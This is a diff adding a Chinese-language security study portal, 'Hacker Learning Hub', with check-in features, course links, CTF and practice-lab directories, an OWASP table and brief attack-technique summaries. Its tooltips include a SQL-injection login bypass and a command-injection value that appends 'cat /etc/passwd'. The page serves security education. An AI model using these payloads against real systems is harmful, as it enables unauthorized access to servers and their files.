@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hacker Learning Hub - 黑客技术学习平台</title>
+<style>
+:root {
+  --bg: #0a0e14; --surface: #131a24; --card: #182230;
+  --border: #1e2d3d; --text: #c8d6e5; --text2: #8b9cb3;
+  --accent: #39d353; --accent2: #58a6ff; --warn: #f0883e;
+  --danger: #f85149; --purple: #a371f7;
+  --radius: 10px; --shadow: 0 2px 8px rgba(0,0,0,.3);
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  background: var(--bg); color: var(--text);
+  font-family: 'Segoe UI','Microsoft YaHei',sans-serif;
+  line-height:1.6; min-height:100vh;
+}
+header {
+  background: var(--surface); border-bottom:1px solid var(--border);
+  padding:10px 24px; display:flex; align-items:center;
+  justify-content:space-between; position:sticky; top:0; z-index:100;
+}
+.logo { font-size:1.3em; font-weight:bold; }
+.logo span { color:var(--accent); }
+.nav { display:flex; gap:2px; flex-wrap:wrap; }
+.nav a {
+  color:var(--text2); text-decoration:none; padding:5px 12px;
+  border-radius:6px; font-size:.85em; transition:.2s;
+}
+.nav a:hover, .nav a.active { color:#fff; background:var(--card); }
+main { max-width:1300px; margin:0 auto; padding:16px 20px; }
+.card {
+  background:var(--card); border:1px solid var(--border);
+  border-radius:var(--radius); padding:18px; margin-bottom:14px;
+  box-shadow:var(--shadow);
+}
+.card h2 { font-size:1.05em; margin-bottom:10px; color:var(--accent2); display:flex; align-items:center; gap:6px; }
+.card h3 { color:var(--accent); margin-bottom:6px; font-size:.95em; }
+.tag {
+  display:inline-block; padding:2px 8px; border-radius:4px; font-size:.72em; margin:2px 3px;
+}
+.tag-g { background:var(--accent); color:#000; }
+.tag-b { background:var(--accent2); color:#000; }
+.tag-o { background:var(--warn); color:#000; }
+.tag-r { background:var(--danger); color:#fff; }
+.tag-p { background:var(--purple); color:#fff; }
+/* Buttons */
+.btn {
+  display:inline-block; padding:9px 18px; border-radius:7px;
+  border:none; cursor:pointer; font-size:.9em; font-weight:600;
+  transition:all .2s; text-decoration:none; font-family:inherit;
+  text-align:center;
+}
+.btn-primary { background:var(--accent); color:#000; }
+.btn-primary:hover { filter:brightness(1.25); transform:translateY(-1px); }
+.btn-blue { background:var(--accent2); color:#000; }
+.btn-blue:hover { filter:brightness(1.25); transform:translateY(-1px); }
+.btn-purple { background:var(--purple); color:#fff; }
+.btn-purple:hover { filter:brightness(1.2); transform:translateY(-1px); }
+.btn-orange { background:var(--warn); color:#000; }
+.btn-orange:hover { filter:brightness(1.2); transform:translateY(-1px); }
+.btn-danger { background:var(--danger); color:#fff; }
+.btn-danger:hover { filter:brightness(1.2); transform:translateY(-1px); }
+.btn-outline { background:transparent; border:1.5px solid var(--accent2); color:var(--accent2); }
+.btn-outline:hover { background:var(--accent2); color:#000; }
+.btn-sm { padding:5px 12px; font-size:.78em; }
+.btn-xl { padding:14px 28px; font-size:1em; }
+/* Grid */
+.grid2 { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
+.grid3 { display:grid; grid-template-columns:repeat(3,1fr); gap:14px; }
+@media(max-width:900px){ .grid2,.grid3 { grid-template-columns:1fr; } }
+/* Link buttons container */
+.btns { display:flex; flex-wrap:wrap; gap:8px; }
+/* Inputs */
+input, textarea {
+  width:100%; padding:10px; border-radius:6px;
+  border:1px solid var(--border); background:var(--surface);
+  color:var(--text); font-size:.9em; font-family:inherit;
+}
+textarea { resize:vertical; min-height:70px; }
+/* Streak */
+.streak-badge {
+  display:inline-flex; align-items:center; gap:6px;
+  background:var(--surface); padding:6px 14px; border-radius:20px; border:1px solid var(--border);
+}
+.streak-fire { font-size:1.4em; }
+.streak-num { font-size:1.2em; font-weight:bold; color:var(--warn); }
+/* Quote */
+.quote-box {
+  background:linear-gradient(135deg, #1a2740, #182230);
+  border-left:3px solid var(--accent2); padding:14px 18px;
+  border-radius:0 var(--radius) var(--radius) 0; margin-bottom:12px;
+}
+.quote-text { font-size:1em; font-style:italic; color:var(--accent2); }
+.quote-author { font-size:.78em; color:var(--text2); margin-top:4px; }
+/* Checkin days */
+.cal-row { display:flex; gap:3px; flex-wrap:wrap; }
+.checkin-day {
+  display:inline-block; width:30px; height:30px; line-height:30px;
+  text-align:center; border-radius:4px; margin:1px; font-size:.72em;
+}
+.checkin-done { background:var(--accent); color:#000; }
+.checkin-miss { background:var(--card); color:var(--text2); border:1px solid var(--border); }
+/* Sections */
+.section { display:none; }
+.section.active { display:block; }
+/* News */
+.news-item { padding:7px 0; border-bottom:1px solid var(--border); font-size:.85em; }
+.news-item:last-child { border:none; }
+/* Vuln table */
+.vuln-table { width:100%; border-collapse:collapse; font-size:.82em; }
+.vuln-table th,.vuln-table td { padding:7px; text-align:left; border-bottom:1px solid var(--border); }
+.vuln-table th { color:var(--accent); }
+/* 主页跳转卡片 */
+.jump-card {
+  background:var(--card); border:1px solid var(--border);
+  border-radius:var(--radius); padding:16px;
+  transition:.2s; cursor:pointer; text-decoration:none;
+  color:var(--text); display:block;
+}
+.jump-card:hover { border-color:var(--accent2); transform:translateY(-2px); box-shadow:0 4px 16px rgba(88,166,255,.1); }
+.jump-card .icon { font-size:2em; margin-bottom:8px; }
+.jump-card .title { font-weight:bold; font-size:1em; margin-bottom:4px; color:var(--accent2); }
+.jump-card .desc { font-size:.78em; color:var(--text2); }
+/* Tooltip */
+[data-tip] { position:relative; cursor:help; }
+[data-tip]:hover::after {
+  content:attr(data-tip);
+  position:absolute; bottom:calc(100% + 8px); left:50%;
+  transform:translateX(-50%);
+  background:#1e2d3d; color:#c8d6e5; padding:6px 12px;
+  border-radius:6px; font-size:.75em; font-weight:normal;
+  white-space:nowrap; z-index:999; pointer-events:none;
+  border:1px solid var(--accent2);
+  box-shadow:0 4px 12px rgba(0,0,0,.5);
+}
+    /* Floating Draggable Chat Panel */
+    .chat-panel { position:fixed; top:80px; right:30px; width:420px; height:520px; min-width:320px; min-height:300px; background:var(--surface); border:1px solid var(--border); border-radius:12px; z-index:200; display:none; flex-direction:column; overflow:hidden; box-shadow:0 8px 40px rgba(0,0,0,.7); }
+    .chat-panel.open { display:flex; }
+    .chat-toggle-btn { position:fixed; bottom:24px; right:24px; z-index:201; width:52px; height:52px; border-radius:50%; background:var(--accent2); border:none; color:#fff; font-size:1.4em; cursor:pointer; box-shadow:0 4px 16px rgba(88,166,255,.4); transition:.2s; }
+    .chat-toggle-btn:hover { transform:scale(1.1); }
+    .chat-header { background:var(--card); padding:10px 14px; border-bottom:1px solid var(--border); font-weight:bold; display:flex; justify-content:space-between; align-items:center; flex-shrink:0; cursor:move; user-select:none; }
+    .chat-header .btn-icon { background:none; border:none; color:var(--text2); cursor:pointer; font-size:1.1em; padding:4px 8px; border-radius:4px; }
+    .chat-header .btn-icon:hover { color:#fff; background:var(--border); }
+    .chat-messages { flex:1; overflow-y:auto; padding:10px; display:flex; flex-direction:column; gap:6px; }
+    .chat-msg { max-width:90%; padding:9px 13px; border-radius:12px; font-size:.84em; line-height:1.5; word-break:break-word; }
+    .chat-msg.user { align-self:flex-end; background:var(--accent2); color:#fff; border-bottom-right-radius:4px; }
+    .chat-msg.bot { align-self:flex-start; background:var(--card); border:1px solid var(--border); border-bottom-left-radius:4px; }
+    .chat-msg.bot code { background:var(--surface); padding:1px 5px; border-radius:3px; font-size:.85em; color:var(--accent); }
+    .chat-msg.bot pre { background:var(--surface); padding:8px; border-radius:6px; overflow-x:auto; font-size:.78em; margin:4px 0; }
+    .chat-input-area { display:flex; gap:6px; padding:8px 10px; border-top:1px solid var(--border); flex-shrink:0; }
+    .chat-input-area input { flex:1; padding:8px 12px; border-radius:18px; border:1px solid var(--border); background:var(--bg); color:var(--text); font-size:.84em; }
+    .chat-input-area button { width:34px; height:34px; border-radius:50%; border:none; background:var(--accent2); color:#fff; cursor:pointer; font-size:.95em; flex-shrink:0; }
+    .suggestions { display:flex; flex-wrap:wrap; gap:5px; padding:0 10px 8px; flex-shrink:0; }
+    .suggestions button { background:var(--card); border:1px solid var(--border); color:var(--text2); padding:3px 9px; border-radius:12px; font-size:.73em; cursor:pointer; }
+    .suggestions button:hover { border-color:var(--accent2); color:var(--accent2); }
+    .chat-typing { color:var(--text2); font-size:.76em; padding:4px 10px; display:none; }
+    .stream-cursor { animation:blink 1s step-end infinite; color:var(--accent2); }
+    @keyframes blink { 50%{opacity:0;} }
+    .dot-anim::after { content:''; animation:dots 1.5s steps(4,end) infinite; }
+    @keyframes dots { 0%{content:'';} 25%{content:'.';} 50%{content:'..';} 75%{content:'...';} 100%{content:'';} }
+    @media(max-width:600px){ .chat-panel{width:calc(100vw-20px)!important;left:10px!important;right:auto!important;top:60px!important;max-height:50vh;} .chat-toggle-btn{bottom:16px;right:16px;} }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">🔐 Hacker <span>Hub</span></div>
+  <nav class="nav" id="nav">
+    <a href="#home" class="active" onclick="showSection('home')">🏠 首页</a>
+    <a href="#beginner" onclick="showSection('beginner')">🌱 0基础</a>
+    <a href="#postgrad" onclick="showSection('postgrad')">📚 考研</a>
+    <a href="#ctf" onclick="showSection('ctf')">🏴 CTF</a>
+    <a href="#range" onclick="showSection('range')">🎯 靶场</a>
+    <a href="#vuln" onclick="showSection('vuln')">💥 漏洞库</a>
+    <a href="#deep" onclick="showSection('deep')">🔬 深度</a>
+    <a href="#news" onclick="showSection('news')">📰 资讯</a>
+  </nav>
+</header>
+
+<main>
+
+<!-- ==================== 首页 ==================== -->
+<section id="section-home" class="section active">
+
+  <!-- 每日金句 -->
+  <div class="card">
+    <div id="daily-quote" class="quote-box">
+      <div class="quote-text">正在加载...</div>
+      <div class="quote-author"></div>
+    </div>
+  </div>
+
+  <!-- 快捷入口卡片 -->
+  <div class="grid3" style="margin-bottom:14px;">
+    <a href="#beginner" onclick="showSection('beginner');return false" class="jump-card">
+      <div class="icon">🌱</div><div class="title">0基础入门</div>
+      <div class="desc">小迪安全 / Linux / HTML / Python</div>
+    </a>
+    <a href="#postgrad" onclick="showSection('postgrad');return false" class="jump-card">
+      <div class="icon">📚</div><div class="title">考研 408</div>
+      <div class="desc">王道计网/OS/数据结构/计组</div>
+    </a>
+    <a href="#ctf" onclick="showSection('ctf');return false" class="jump-card">
+      <div class="icon">🏴</div><div class="title">CTF 竞赛</div>
+      <div class="desc">BUUCTF / NSSCTF / CTFHub / 工具</div>
+    </a>
+    <a href="#range" onclick="showSection('range');return false" class="jump-card">
+      <div class="icon">🎯</div><div class="title">靶场训练</div>
+      <div class="desc">Pikachu / DVWA / HTB / TryHackMe</div>
+    </a>
+    <a href="#vuln" onclick="showSection('vuln');return false" class="jump-card">
+      <div class="icon">💥</div><div class="title">漏洞库</div>
+      <div class="desc">OWASP Top 10 / SQL注入 / XSS / SSRF</div>
+    </a>
+    <a href="#deep" onclick="showSection('deep');return false" class="jump-card">
+      <div class="icon">🔬</div><div class="title">深度解析</div>
+      <div class="desc">水坑攻击 / 提权 / 内网渗透 / 反弹Shell</div>
+    </a>
+  </div>
+
+  <!-- 打卡 -->
+  <div class="card">
+    <h2>📅 每日打卡</h2>
+    <div style="display:flex;align-items:center;gap:14px;margin-bottom:12px;flex-wrap:wrap;">
+      <div class="streak-badge">
+        <span class="streak-fire">🔥</span>
+        <span>连续</span>
+        <span class="streak-num" id="streak-count">0</span>
+        <span>天</span>
+      </div>
+      <button class="btn btn-primary btn-xl" id="btn-checkin" onclick="doCheckin()">✅ 今日打卡</button>
+      <span style="color:var(--text2);font-size:.82em;" id="today-status"></span>
+    </div>
+    <h3>📝 今日学习笔记</h3>
+    <textarea id="note-input" placeholder="今天学了什么？心得、疑问、明天计划..."></textarea>
+    <button class="btn btn-outline btn-sm" onclick="saveNote()" style="margin-top:8px;">💾 保存笔记</button>
+    <span id="note-saved" style="color:var(--accent);font-size:.78em;margin-left:8px;"></span>
+  </div>
+
+  <div class="grid2">
+    <div class="card">
+      <h2>📆 本月打卡</h2>
+      <div class="cal-row" id="cal-view"></div>
+    </div>
+    <div class="card">
+      <h2>📒 最近笔记</h2>
+      <div id="recent-notes" style="max-height:180px;overflow-y:auto;"></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>📰 安全快讯</h2>
+    <div id="daily-news"></div>
+    <a href="#news" onclick="showSection('news');return false" class="btn btn-outline btn-sm" style="margin-top:10px;">查看全部资讯 →</a>
+  </div>
+</section>
+
+<!-- ==================== 0基础专区 ==================== -->
+<section id="section-beginner" class="section">
+  <div class="card">
+    <h2>🌱 0基础学习路线</h2>
+    <div class="btns" style="margin-bottom:12px;">
+      <span class="tag tag-g">Step 1: Linux基础</span>
+      <span class="tag tag-b">Step 2: HTML/HTTP</span>
+      <span class="tag tag-o">Step 3: Python</span>
+      <span class="tag tag-p">Step 4: 安全入门</span>
+    </div>
+  </div>
+  <div class="grid2">
+    <div class="card">
+      <h2>📺 小迪安全入门</h2>
+      <div class="btns">
+        <a href="https://www.bilibili.com/video/BV123yAYMEwb/" target="_blank" class="btn btn-primary">🎬 V2024 全栈渗透（240+P）</a>
+        <a href="https://space.bilibili.com/346375059" target="_blank" class="btn btn-blue">👤 小迪安全 B站主页</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2>🐧 Linux 基础</h2>
+      <div class="btns">
+        <a href="https://www.bilibili.com/video/BV1n84y1i7td/" target="_blank" class="btn btn-primary">🎬 黑马新版Linux零基础</a>
+        <a href="https://www.runoob.com/linux/linux-tutorial.html" target="_blank" class="btn btn-blue">📖 菜鸟教程 Linux命令</a>
+        <a href="https://overthewire.org/wargames/bandit/" target="_blank" class="btn btn-purple">🎮 OverTheWire Bandit</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2>🌐 Web基础</h2>
+      <div class="btns">
+        <a href="https://developer.mozilla.org/zh-CN/docs/Learn/HTML" target="_blank" class="btn btn-primary">📖 MDN HTML 教程</a>
+        <a href="https://www.bilibili.com/video/BV1p84y1P7Z5" target="_blank" class="btn btn-blue">🎬 黑马 HTML+CSS</a>
+        <a href="https://httpbin.org/" target="_blank" class="btn btn-orange">🧪 HTTPBin 实验</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2>🖥️ 做网页（前端开发）</h2>
+      <p style="font-size:.78em;color:var(--warn);margin-bottom:8px;">⭐ 学Web安全必须先会做网页，不然SQL注入、XSS全是天书</p>
+      <div class="btns">
+        <a href="https://www.bilibili.com/video/BV14J4114768" target="_blank" class="btn btn-primary" data-tip="B站最强前端入门课。HTML5+CSS3+移动端布局，Pink老师讲课幽默，零基础友好。认识div/p/a/form/input标签、学会写网页布局。">🎬 Pink老师 HTML+CSS 零基础</a>
+        <a href="https://www.bilibili.com/video/BV1Y84y1L7Nn" target="_blank" class="btn btn-orange">🎬 Pink 老师 JavaScript 基础</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2>🐍 Python</h2>
+      <div class="btns">
+        <a href="https://www.bilibili.com/video/BV1qW4y1a7fU" target="_blank" class="btn btn-primary">🎬 黑马 Python 600集</a>
+        <a href="https://docs.python.org/zh-cn/3/tutorial/" target="_blank" class="btn btn-blue">📖 Python 官方教程</a>
+        <a href="https://www.runoob.com/python3/python3-tutorial.html" target="_blank" class="btn btn-outline">📖 菜鸟 Python3</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2>🔧 必装工具</h2>
+      <div class="btns">
+        <a href="https://www.vmware.com/" target="_blank" class="btn btn-orange" data-tip="虚拟机软件。创建隔离的操作系统环境，在电脑上同时运行多个系统。安全学习必修——所有渗透测试都应在虚拟机中进行。">💿 VMware</a>
+        <a href="https://www.kali.org/get-kali/" target="_blank" class="btn btn-purple" data-tip="黑客专用 Linux 发行版。预装 Nmap/Burp/Metasploit 等 600+ 安全工具，是安全从业者的标准操作系统。">🐉 Kali Linux</a>
+        <a href="https://portswigger.net/burp/communitydownload" target="_blank" class="btn btn-danger" data-tip="Web渗透测试核心工具。可以拦截和修改浏览器与服务器之间的HTTP请求/响应，是Web安全第一工具。">🔴 Burp Suite</a>
+        <a href="https://www.wireshark.org/" target="_blank" class="btn btn-blue" data-tip="网络协议分析工具。捕获网卡上流经的所有数据包，用于分析网络协议和安全排查。">🦈 Wireshark</a>
+        <a href="https://code.visualstudio.com/" target="_blank" class="btn btn-outline">📝 VS Code</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2>📖 入门书籍（学完基础再看）</h2>
+      <p style="font-size:.82em;color:var(--text2);">
+        《白帽子讲Web安全》| 《Web安全攻防》| 《鸟哥的Linux私房菜》
+      </p>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 考研 ==================== -->
+<section id="section-postgrad" class="section">
+  <div class="card"><h2>📚 408 考研 — 王道系列</h2>
+    <p style="color:var(--text2);font-size:.85em;">网络安全考研核心四门科目，学好就是安全地基</p>
+  </div>
+  <div class="grid2">
+    <div class="card">
+      <h2>🌐 计算机网络</h2>
+      <div class="btns">
+        <a href="https://www.bilibili.com/video/BV19E411D78Q" target="_blank" class="btn btn-primary">🎬 王道 计网 全程班</a>
+        <a href="https://www.bilibili.com/video/BV1c4411d7jb" target="_blank" class="btn btn-blue">🎬 湖科大教书匠 计网微课堂</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2>💻 操作系统</h2>
+      <div class="btns">
+        <a href="https://www.bilibili.com/video/BV1YE411D7nH" target="_blank" class="btn btn-primary">🎬 王道 操作系统 全程班</a>
+        <a href="https://www.bilibili.com/video/BV1js411b7vg/" target="_blank" class="btn btn-blue">🎬 清华大学 操作系统</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2>🧮 数据结构</h2>
+      <div class="btns">
+        <a href="https://www.bilibili.com/video/BV1b7411N798" target="_blank" class="btn btn-primary">🎬 王道 数据结构 全程班</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2>🔢 计算机组成原理</h2>
+      <div class="btns">
+        <a href="https://www.bilibili.com/video/BV1ps4y1d73V/" target="_blank" class="btn btn-primary">🎬 王道 计组 最新版</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2>🔐 密码学</h2>
+      <div class="btns">
+        <a href="https://www.bilibili.com/video/av40745525/" target="_blank" class="btn btn-primary">🎬 可汗学院 密码学 65集</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2>📝 考研工具</h2>
+      <div class="btns">
+        <a href="https://www.cskaoyan.com/" target="_blank" class="btn btn-blue">🌐 王道论坛</a>
+        <a href="https://github.com/SSHeRun/CS-Xmind-Note" target="_blank" class="btn btn-outline">🧠 408 思维导图</a>
+        <a href="https://www.408os.cn/dashboard" target="_blank" class="btn btn-purple">📊 408OS 刷题面板</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== CTF ==================== -->
+<section id="section-ctf" class="section">
+  <div class="card"><h2>🏴 CTF 竞赛资源</h2></div>
+  <div class="grid3">
+    <div class="card">
+      <h2>🎮 练习平台</h2>
+      <div class="btns">
+        <a href="https://buuoj.cn/" target="_blank" class="btn btn-primary" data-tip="国内最大CTF在线题库。支持在线环境一键启动，无需自己搭建靶场。">BUUCTF</a>
+        <a href="https://www.nssctf.cn/" target="_blank" class="btn btn-blue" data-tip="新手友好CTF平台。每道题配有详细WriteUp（解题报告），入门首选。">NSSCTF</a>
+        <a href="https://ctfhub.com/" target="_blank" class="btn btn-purple" data-tip="按技能树分类的CTF练习平台。从基础到高阶，逐级训练不跳跃。">CTFHub</a>
+        <a href="https://adworld.xctf.org.cn/" target="_blank" class="btn btn-orange">攻防世界</a>
+        <a href="https://picoctf.org/" target="_blank" class="btn btn-outline">PicoCTF</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2>🛠️ CTF 工具</h2>
+      <div class="btns">
+        <a href="https://github.com/WangYihang/ctftools" target="_blank" class="btn btn-primary">CTF 工具合集</a>
+        <a href="https://gchq.github.io/CyberChef/" target="_blank" class="btn btn-blue">CyberChef 在线工具</a>
+        <a href="https://www.dcode.fr/" target="_blank" class="btn btn-purple">dCode 密码学</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2>📖 学习资源</h2>
+      <div class="btns">
+        <a href="https://ctf-wiki.org/" target="_blank" class="btn btn-primary">CTF Wiki</a>
+        <a href="https://github.com/ctfs" target="_blank" class="btn btn-blue">WriteUp 合集</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 靶场 ==================== -->
+<section id="section-range" class="section">
+  <div class="card"><h2>🎯 渗透测试靶场</h2></div>
+  <div class="grid2">
+    <div class="card">
+      <h2 style="color:var(--accent);">🥇 入门</h2>
+      <div class="btns">
+        <a href="https://github.com/zhuifengshaonianhanlu/pikachu" target="_blank" class="btn btn-primary" data-tip="⭐最推荐新手！每个漏洞有中文解释+'提示'按钮，比DVWA更适合零基础。">⭐ Pikachu（中文提示）</a>
+        <a href="https://github.com/digininja/DVWA" target="_blank" class="btn btn-blue" data-tip="经典PHP靶场。包含SQL注入/XSS/CSRF等10种漏洞，难度可调(Low/Medium/High)。">DVWA 经典靶场</a>
+        <a href="https://github.com/Audi-1/sqli-labs" target="_blank" class="btn btn-purple" data-tip="65关SQL注入专项训练。从GET注入到盲注，全面覆盖各种SQL注入场景。">SQLi-Labs 65关</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2 style="color:var(--warn);">🥈 进阶</h2>
+      <div class="btns">
+        <a href="https://github.com/c0ny1/upload-labs" target="_blank" class="btn btn-orange">Upload-Labs</a>
+        <a href="https://portswigger.net/web-security" target="_blank" class="btn btn-danger">Burp 官方 Academy</a>
+        <a href="https://tryhackme.com/" target="_blank" class="btn btn-purple">TryHackMe</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2 style="color:var(--danger);">🥇 高级</h2>
+      <div class="btns">
+        <a href="https://www.hackthebox.com/" target="_blank" class="btn btn-danger" data-tip="全球最大在线渗透测试平台。提供真实场景虚拟机，高级玩家聚集地。">Hack The Box</a>
+        <a href="https://www.vulnhub.com/" target="_blank" class="btn btn-purple" data-tip="免费虚拟机靶场下载站。下载镜像后在本地VMware练习，无需联网。">VulnHub</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2 style="color:var(--accent2);">🔧 在线速查</h2>
+      <div class="btns">
+        <a href="https://www.revshells.com/" target="_blank" class="btn btn-primary">反弹Shell生成</a>
+        <a href="https://gtfobins.github.io/" target="_blank" class="btn btn-blue">Linux GTFOBins</a>
+        <a href="https://lolbas-project.github.io/" target="_blank" class="btn btn-purple">Windows LOLBAS</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 漏洞库 ==================== -->
+<section id="section-vuln" class="section">
+  <div class="card"><h2>💥 漏洞分类速查</h2></div>
+  <div class="grid2">
+    <div class="card">
+      <h2 style="color:var(--danger);">🔴 OWASP Top 10</h2>
+      <table class="vuln-table">
+        <tr><th>漏洞</th><th>级别</th><th>练习</th></tr>
+        <tr><td>A01: 访问控制失效</td><td><span class="tag tag-r">严重</span></td><td><a href="https://portswigger.net/web-security/access-control" target="_blank" class="btn btn-outline btn-sm">Lab →</a></td></tr>
+        <tr><td>A02: 加密失败</td><td><span class="tag tag-r">严重</span></td><td><a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" target="_blank" class="btn btn-outline btn-sm">OWASP →</a></td></tr>
+        <tr><td>A03: 注入攻击</td><td><span class="tag tag-r">严重</span></td><td><a href="https://portswigger.net/web-security/sql-injection" target="_blank" class="btn btn-outline btn-sm">Lab →</a></td></tr>
+        <tr><td>A04: 不安全设计</td><td><span class="tag tag-o">高</span></td><td><a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" target="_blank" class="btn btn-outline btn-sm">OWASP →</a></td></tr>
+        <tr><td>A05: 安全配置错误</td><td><span class="tag tag-o">高</span></td><td><a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" target="_blank" class="btn btn-outline btn-sm">OWASP →</a></td></tr>
+        <tr><td>A06: 易受攻击组件</td><td><span class="tag tag-o">高</span></td><td><a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" target="_blank" class="btn btn-outline btn-sm">OWASP →</a></td></tr>
+        <tr><td>A07: 认证失效</td><td><span class="tag tag-o">高</span></td><td><a href="https://portswigger.net/web-security/authentication" target="_blank" class="btn btn-outline btn-sm">Lab →</a></td></tr>
+      </table>
+    </div>
+    <div class="card">
+      <h2 style="color:var(--warn);">🟠 Web 注入类漏洞</h2>
+      <div class="btns">
+        <a href="https://portswigger.net/web-security/sql-injection" target="_blank" class="btn btn-danger" data-tip="在用户输入中插入恶意SQL语句，欺骗数据库执行非预期操作。如: admin' OR '1'='1 可绕过登录。">SQL 注入</a>
+        <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" class="btn btn-orange" data-tip="向网页注入恶意JavaScript，在受害者浏览器中执行。分反射型、存储型、DOM型三种。">XSS 跨站脚本</a>
+        <a href="https://portswigger.net/web-security/ssrf" target="_blank" class="btn btn-purple" data-tip="服务端请求伪造。利用服务器发起对内网请求，绕过防火墙。常用于云环境打169.254.169.254元数据。">SSRF</a>
+        <a href="https://portswigger.net/web-security/os-command-injection" target="_blank" class="btn btn-primary" data-tip="在输入中拼接系统命令，如输入 127.0.0.1 & cat /etc/passwd 可读取服务器文件。">命令注入</a>
+        <a href="https://portswigger.net/web-security/xxe" target="_blank" class="btn btn-blue" data-tip="利用XML解析器处理外部实体，读取服务器文件或发起SSRF。防御：禁用外部实体。">XXE 注入</a>
+        <a href="https://portswigger.net/web-security/file-path-traversal" target="_blank" class="btn btn-orange">LFI 文件包含</a>
+        <a href="https://portswigger.net/web-security/deserialization" target="_blank" class="btn btn-danger">反序列化</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 深度解析 ==================== -->
+<section id="section-deep" class="section">
+  <div class="card"><h2>🔬 技术深度解析</h2></div>
+  <div class="grid2">
+    <div class="card">
+      <h2 style="color:var(--danger);">🎯 水坑攻击</h2>
+      <p style="font-size:.82em;color:var(--text2);margin-bottom:8px;">攻击者在目标常访问的合法网站植入恶意代码，当目标访问时自动感染。</p>
+      <p style="font-size:.78em;">流程：侦察 → 入侵合法站 → 植入恶意JS → 等待 → 控制目标</p>
+      <p style="font-size:.78em;">防御：浏览器沙箱、及时更新、虚拟化隔离上网</p>
+      <a href="https://attack.mitre.org/techniques/T1189/" target="_blank" class="btn btn-outline btn-sm" style="margin-top:8px;">MITRE ATT&CK T1189 →</a>
+    </div>
+    <div class="card">
+      <h2 style="color:var(--danger);">🗡️ 高级SQL注入绕WAF</h2>
+      <p style="font-size:.82em;color:var(--text2);margin-bottom:8px;">大小写混写、内联注释、URL编码、Unicode编码、分块传输、参数污染</p>
+      <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" class="btn btn-outline btn-sm">SQL注入速查表 →</a>
+    </div>
+    <div class="card">
+      <h2 style="color:var(--warn);">🕸️ CSRF 跨站请求伪造</h2>
+      <p style="font-size:.82em;color:var(--text2);">诱导已登录用户执行非预期操作。防御：CSRF Token、SameSite Cookie</p>
+      <a href="https://portswigger.net/web-security/csrf" target="_blank" class="btn btn-outline btn-sm">PortSwigger Lab →</a>
+    </div>
+    <div class="card">
+      <h2 style="color:var(--warn);">🔑 JWT 攻击</h2>
+      <p style="font-size:.82em;color:var(--text2);">alg:none绕过、密钥爆破、kid注入、JWT混淆攻击</p>
+      <a href="https://portswigger.net/web-security/jwt" target="_blank" class="btn btn-outline btn-sm">PortSwigger Lab →</a>
+    </div>
+    <div class="card">
+      <h2 style="color:var(--purple);">☁️ 云安全攻击</h2>
+      <p style="font-size:.82em;color:var(--text2);">公开S3存储桶、IAM权限过大、SSRF打169.254.169.254获取元数据</p>
+      <a href="https://hackingthe.cloud/" target="_blank" class="btn btn-outline btn-sm">Hacking The Cloud →</a>
+    </div>
+    <div class="card">
+      <h2 style="color:var(--purple);">🐚 反弹Shell</h2>
+      <p style="font-size:.82em;color:var(--text2);">Bash/Python/PHP/NC/PowerShell 反弹Shell方法大全</p>
+      <a href="https://www.revshells.com/" target="_blank" class="btn btn-outline btn-sm">在线生成器 →</a>
+    </div>
+    <div class="card">
+      <h2 style="color:var(--accent);">🔓 权限提升</h2>
+      <p style="font-size:.82em;color:var(--text2);">Linux：SUID/Capabilities/Cron/内核Exploit<br>Windows：服务权限/UAC/Token</p>
+      <div class="btns" style="margin-top:6px;">
+        <a href="https://gtfobins.github.io/" target="_blank" class="btn btn-outline btn-sm">Linux GTFOBins</a>
+        <a href="https://lolbas-project.github.io/" target="_blank" class="btn btn-outline btn-sm">Windows LOLBAS</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2 style="color:var(--accent);">🔍 内网渗透</h2>
+      <p style="font-size:.82em;color:var(--text2);">Pass-the-Hash、Kerberoasting、黄金/白银票据、SMB Relay、横向移动</p>
+      <a href="https://attack.mitre.org/tactics/TA0008/" target="_blank" class="btn btn-outline btn-sm">MITRE ATT&CK →</a>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 安全新闻 ==================== -->
+<section id="section-news" class="section">
+  <div class="card"><h2>📰 资讯</h2></div>
+  <div class="grid2">
+    <div class="card">
+      <h2>🇨🇳 中文资讯</h2>
+      <div class="btns">
+        <a href="https://www.freebuf.com/" target="_blank" class="btn btn-primary">FreeBuf</a>
+        <a href="https://www.anquanke.com/" target="_blank" class="btn btn-blue">安全客</a>
+        <a href="https://xz.aliyun.com/" target="_blank" class="btn btn-purple">先知社区</a>
+        <a href="https://paper.seebug.org/" target="_blank" class="btn btn-orange">Seebug Paper</a>
+        <a href="https://www.secrss.com/" target="_blank" class="btn btn-outline">安全内参</a>
+      </div>
+    </div>
+    <div class="card">
